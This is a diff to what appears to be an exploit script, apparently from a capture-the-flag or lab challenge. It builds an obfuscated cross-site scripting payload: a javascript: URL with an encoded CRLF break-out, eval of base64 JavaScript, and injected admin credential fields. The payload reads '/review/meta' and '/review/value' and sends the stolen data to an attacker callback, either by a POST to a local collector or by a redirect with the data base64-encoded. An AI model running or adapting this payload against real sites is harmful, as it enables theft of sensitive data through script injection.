@@ -59,7 +59,9 @@ async function waitForService() {
 async function main() {
   await waitForService();
 
-  const js = `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t))`;
+  const js = callbackBase.startsWith('http://127.0.0.1:1337/collect')
+    ? `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>fetch(${JSON.stringify(callbackBase)},{method:'POST',headers:{'Content-Type':'text/plain'},body:m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t}))`
+    : `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t))`;
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
 
